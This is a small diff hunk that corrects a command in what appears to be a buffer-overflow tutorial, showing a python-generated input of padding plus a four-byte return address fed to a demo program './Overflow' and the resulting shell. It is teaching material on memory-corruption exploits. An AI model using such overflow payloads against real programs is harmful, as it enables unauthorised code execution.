@@ -121,7 +121,7 @@ Example scenario would be something like this. The function which is never actua
 ```shell
 # ./Overflow $(python -c 'print "A" * 10')
 AAAAAAAAAA
-# .$(python -c 'print "A" * 20 + "\x11\x11\x11\x11"')
+# ./Overflow $(python -c 'print "A" * 20 + "\x11\x11\x11\x11"')
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGUUUUAccidental shell access appeared
 # exit
 exit
